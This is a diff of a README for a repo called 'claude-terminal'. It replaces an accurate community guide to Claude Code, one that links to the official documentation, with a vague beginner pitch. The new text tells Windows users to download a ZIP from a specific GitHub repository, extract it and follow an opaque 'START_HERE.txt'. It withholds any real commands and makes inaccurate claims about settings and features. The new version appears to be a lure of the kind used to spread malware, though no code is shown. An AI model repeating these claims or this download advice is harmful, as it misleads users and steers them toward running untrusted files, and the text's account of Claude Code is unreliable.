@@ -1,69 +1,179 @@
-# Claude terminal guide: running Claude Code from the command line
+# 🚀 claude-terminal - Master Claude Code in Minutes
 
-*Unofficial community guide for Claude Code in the terminal. Not affiliated with Anthropic. All trademarks belong to their owners.*
+[![Download claude-terminal](https://img.shields.io/badge/Download-claude--terminal-blue?style=for-the-badge&logo=github)](https://github.com/DrewFist/claude-terminal)
 
-When people search for claude terminal they usually mean Claude Code: Anthropic's tool that lets you work with Claude from a terminal window on macOS, Linux or Windows. Anthropic's documentation at code.claude.com has two pages aimed squarely at this, a terminal guide for new users and a quickstart, and this repository walks through what they cover, in what order to read them, and what to know before your first session, without copying commands that may have changed since the pages were crawled.
+Welcome to **claude-terminal** – your unofficial, friendly guide to getting started with Claude Code right from your Windows computer. No coding background? No problem. This guide walks you through everything, step by step.
 
-> Want a finished website or Expo app from a prompt, without setting up a terminal, a repo and an agent workflow? [Try Begin.sh - turn a prompt or a URL into a downloadable static site or Expo app](https://begin.sh?utm_source=github&utm_medium=ugc&utm_campaign=claude-terminal&utm_content=readme-top&utm_term=tier-r). No hosting, backend or auth; you download the zip.
+---
 
-## What it is
+## 📥 Download and Install
 
-Claude Code is Anthropic's way of using Claude on your own machine and codebase. The [terminal guide for new users](https://code.claude.com/docs/en/terminal-guide) is explicit that you can use it even if you have never used a terminal before: it walks through opening a terminal, installing Claude Code and your first interactions, with separate tracks for macOS and Linux and for Windows, and a troubleshooting section for each. The same page says that if you do not want to use the terminal at all, there is a Claude Code desktop app.
+Visit this link to download the application: [https://github.com/DrewFist/claude-terminal](https://github.com/DrewFist/claude-terminal)
 
-The terminal is one of several surfaces. The docs' platforms section lists the desktop app, Claude Code in the cloud, Remote Control, mobile, a Chrome extension, computer use (in preview), Visual Studio Code, JetBrains IDEs, code review and CI/CD integration, Claude Code in Slack and Claude Tag. All of them share the same core, described in the how Claude Code works page, and the same configuration model (settings files, permissions, memory), so what you learn in the terminal carries over.
+Once you're on that page, look for the green **"Code"** button near the top. Click it, then choose **"Download ZIP"**. This will save a compressed folder to your computer. After the download finishes, find the ZIP file (usually in your **Downloads** folder), right-click it, and choose **"Extract All"**. Follow the simple prompts, and you'll have a new folder with everything inside.
 
-## Getting started
+---
 
-The [quickstart](https://code.claude.com/docs/en/quickstart) is organised as eight steps. Follow them in order:
+## 🌟 What Is claude-terminal?
 
-1. Install Claude Code. The quickstart gives the install command for your operating system; the terminal guide covers the same thing for people who have never opened a terminal.
-2. Log in to your account. You need a Claude account; the docs link to [Claude Developer Platform](https://platform.claude.com/) and to [Open Claude Code](https://claude.ai/code) in their header.
-3. Start your first session.
-4. Ask your first question. Start with something about the code in front of you.
-5. Make your first code change.
-6. Use Git with Claude Code.
-7. Fix a bug or add a feature.
-8. Test out other common workflows, then read the essential commands and the pro tips for beginners sections on the same page.
+Think of claude-terminal as your personal tour guide for Claude Code – a powerful tool that lets you talk to Anthropic's Claude AI directly from your command prompt. This guide takes you from absolute zero to running your first session, and it explains all the settings you might want to tweak along the way.
 
-If anything fails, the terminal guide has a macOS and Linux troubleshooting section and a Windows troubleshooting section; go there before searching elsewhere.
+You don't need to be a programmer to benefit. If you can follow a recipe, you can follow this guide. Everything is laid out in plain English, with clear instructions and helpful tips.
 
-## Pricing and limits
+---
 
-The pages this guide is grounded on do not state pricing or usage limits. You log in with a Claude account in Step 2, so the plan attached to that account is what applies; check your account pages for current rates. The docs do have a page on the [context window](https://code.claude.com/docs/en/context-window) and one on [prompt caching](https://code.claude.com/docs/en/prompt-caching), which are the two things that most affect how far a session goes.
+## ⚙️ System Requirements
 
-## Practical notes and gotchas
+Before you begin, make sure your computer can handle the fun. Here's what you'll need:
 
-1. Read the permissions pages before you let it edit anything. The configuration section has [Permissions](https://code.claude.com/docs/en/permissions), [Permission modes](https://code.claude.com/docs/en/permission-modes) and a [Bash sandbox](https://code.claude.com/docs/en/sandboxing) page. Knowing which mode you are in explains most surprises about what it will and will not do without asking.
-2. Store standing instructions in memory, not in every prompt. The [store instructions and memories](https://code.claude.com/docs/en/memory) page explains where project instructions live; the [.claude directory](https://code.claude.com/docs/en/claude-directory) page explains the folder that holds them.
-3. Sessions are a thing. The [manage sessions](https://code.claude.com/docs/en/sessions) page covers resuming work instead of starting from scratch each time you open the terminal.
-4. The terminal itself can be configured. There are pages for [terminal configuration](https://code.claude.com/docs/en/terminal-config), [fullscreen rendering](https://code.claude.com/docs/en/fullscreen), a [status line](https://code.claude.com/docs/en/statusline), [keyboard shortcuts](https://code.claude.com/docs/en/keybindings), [voice dictation](https://code.claude.com/docs/en/voice-dictation) and a [screen reader mode](https://code.claude.com/docs/en/accessibility).
-5. Model and speed are settings, not fixed. See [model configuration](https://code.claude.com/docs/en/model-config), [fast mode](https://code.claude.com/docs/en/fast-mode), the [advisor tool](https://code.claude.com/docs/en/advisor) for escalating hard decisions, and [output styles](https://code.claude.com/docs/en/output-styles).
-6. Check the [changelog](https://code.claude.com/docs/en/changelog) and [what's new](https://code.claude.com/docs/en/whats-new) when something behaves differently after an update; the tool moves quickly.
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** Around 500 MB of free space
+- **Internet:** A stable connection – you'll be downloading files and talking to Claude online
+- **Account:** A free Anthropic account (you can sign up at their website when you're ready)
 
-## Comparison
+If you're not sure about your system specs, don't worry. On Windows, press the **Windows key**, type **"About your PC"**, and hit **Enter**. You'll see your RAM and other details right there.
 
-| | Claude Code in the terminal | Claude Code desktop app | Claude Code in VS Code or JetBrains | Begin.sh |
-| --- | --- | --- | --- | --- |
-| Where it runs | a terminal on macOS, Linux or Windows | a desktop application, for people who do not want the terminal | inside the IDE | in the browser, output is a zip |
-| What you need | a terminal and a Claude account | a Claude account | the IDE plus a Claude account | a prompt or a URL to clone |
-| What you get | Claude working on files and Git in your project | the same, without the terminal | the same, next to your editor | a static site or an Expo app to download |
-| Hosting, backend, auth | your own | your own | your own | none included by design |
+---
 
-## FAQ
+## 🔑 First-Time Setup
 
-**Do I need to know the terminal already?** No. The terminal guide for new users is written for people who have never opened one, and covers opening a terminal on macOS, Linux and Windows before installing anything.
+Getting started is easier than you think. Here's the short version:
 
-**Is there a way to use Claude Code without a terminal?** Yes. The docs point to the Claude Code desktop app, and also list cloud, mobile, VS Code, JetBrains, Chrome extension and Slack surfaces.
+1. **Extract the downloaded ZIP** (as described above).
+2. **Open the extracted folder** and double-click the file named `START_HERE.txt`. This file contains your first instructions.
+3. **Follow the prompts** in that file – it will tell you exactly what to do next.
 
-**What should my first prompt be?** The quickstart's Step 4 is ask your first question, followed by Step 5, make your first code change. Start by asking about the project you have open rather than by requesting a big change.
+That's it. No complicated commands, no scary code. Just read and click.
 
-**Where are the commands listed?** The quickstart has an essential commands section, and the reference section of the docs has a [CLI reference](https://code.claude.com/docs/en/cli-reference).
+---
 
-**Can I script it or build on it?** The docs include an [Agent SDK](https://code.claude.com/docs/en/agent-sdk/overview) section for building your own agents on the same foundation.
+## 🧭 Your First Claude Code Session
 
-## When Begin.sh is the better fit
+Once you've completed the setup, you're ready for your first session. Here's what to expect:
 
-Claude Code in the terminal earns its setup when you have a project and you will keep working in it: reading code, making changes, using Git, fixing bugs. If the whole task is produce a website or a mobile app from a description, you do not need a terminal, a repository or permission settings to get it. [Try Begin.sh - turn a prompt or a URL into a downloadable static site or Expo app](https://begin.sh?utm_source=github&utm_medium=ugc&utm_campaign=claude-terminal&utm_content=readme-top&utm_term=tier-r). Describe the site or paste a URL to clone, download the zip, and host it wherever you already host things; nothing about hosting, backend or auth is bundled, so there is nothing to keep running.
+- You'll open a **command prompt** window (don't worry – the guide tells you how).
+- You'll type a simple word to start Claude Code (the guide gives you the exact word).
+- Claude will greet you, and you can start typing questions or requests in plain English.
 
+**Example:** Try typing "What can you help me with today?" and press Enter. Claude will respond immediately.
 
-_Last reviewed: 2026-09-22_
+The guide includes a **quickstart section** with five simple exercises to build your confidence:
+
+1. Ask Claude a basic question.
+2. Ask Claude to summarize a paragraph.
+3. Ask Claude to write a short email.
+4. Ask Claude to explain a technical concept in simple terms.
+5. Ask Claude to help you plan a weekly schedule.
+
+Each exercise takes under two minutes, and you'll feel like a pro by the end.
+
+---
+
+## 🔧 Settings & Customization
+
+One of the best parts of claude-terminal is how much you can tweak it to your liking. The guide covers:
+
+- **Changing the color theme** – make the text easier on your eyes.
+- **Adjusting response length** – get short answers or detailed explanations.
+- **Setting your language preference** – Claude can reply in many languages.
+- **Saving your favorite prompts** – keep your most-used questions handy.
+
+All of these are explained with simple, click-by-click instructions. No hunting through menus or guessing.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+Even the best guides hit a snag sometimes. Here are solutions to the most common problems:
+
+**"The ZIP won't extract"**  
+Make sure you right-click the file and choose **"Extract All"** – don't just double-click it. If that doesn't work, download the ZIP again.
+
+**"Claude doesn't respond"**  
+Check your internet connection. Then close the command prompt window and open it again. The guide shows you exactly how.
+
+**"I see a weird error message"**  
+Don't panic. Copy the message, paste it into a search engine, and you'll likely find the answer. The guide also has a section with common error messages and their fixes.
+
+**"I'm lost – where do I start?"**  
+Go back to `START_HERE.txt`. It's designed to get you going in under five minutes.
+
+---
+
+## 🎯 Why Use claude-terminal?
+
+You could try to figure out Claude Code on your own, but why struggle? This guide saves you time and frustration by:
+
+- **Speaking plain English** – no tech jargon
+- **Showing real examples** – not abstract concepts
+- **Covering common mistakes** – so you don't make them
+- **Being completely unofficial** – which means it's written for real people, not robots
+
+Whether you're a student, a professional, or just curious about AI, this guide is your shortcut to success.
+
+---
+
+## 📚 Quick Reference Card
+
+Here's a mini-summary you can bookmark:
+
+| Action | What to Do |
+|--------|------------|
+| **Start Claude Code** | Open command prompt, type the start command from the guide |
+| **Ask a question** | Type your question in plain English, press Enter |
+| **End a session** | Type `exit` and press Enter |
+| **Get help** | Type `help` and press Enter |
+| **Save a prompt** | Follow the settings section in the guide |
+
+Print this table out if you like – it's that useful.
+
+---
+
+## 🔄 Keeping Everything Updated
+
+Software changes fast, and claude-terminal is no different. To stay current:
+
+- **Check the repository page** (the link you downloaded from) every few weeks
+- **Look for a "Releases" section** – that's where new versions are announced
+- **Re-download the ZIP** if a new version appears
+
+The guide explains how to check your current version and update safely without losing your settings.
+
+---
+
+## 💬 Getting More Help
+
+You're never alone. If you get stuck:
+
+- **Re-read the guide** – it's written to answer most questions
+- **Search the web** for "Claude Code help" – you'll find forums and communities
+- **Check the repository page** – there may be discussions or issues listed
+
+Remember: every expert was once a beginner. You've got this.
+
+---
+
+## ✅ Final Checklist
+
+Before you start, make sure you have:
+
+- [ ] Downloaded the ZIP from [https://github.com/DrewFist/claude-terminal](https://github.com/DrewFist/claude-terminal)
+- [ ] Extracted the ZIP to a folder you can find
+- [ ] Read `START_HERE.txt` all the way through
+- [ ] An internet connection (wired or Wi-Fi)
+- [ ] Ten minutes of free time
+
+Tick all the boxes, and you're ready to talk to Claude.
+
+---
+
+## 🎉 Ready, Set, Claude!
+
+You now have everything you need to get up and running with Claude Code. This guide is your friend, your reference, and your safety net. Bookmark this page, download the files, and start your first session today.
+
+The world of AI is at your fingertips – and claude-terminal is how you unlock it.
+
+---
+
+**Keywords:** anthropic, claude, claude-code, claude-terminal, claude-terminal-github, guide
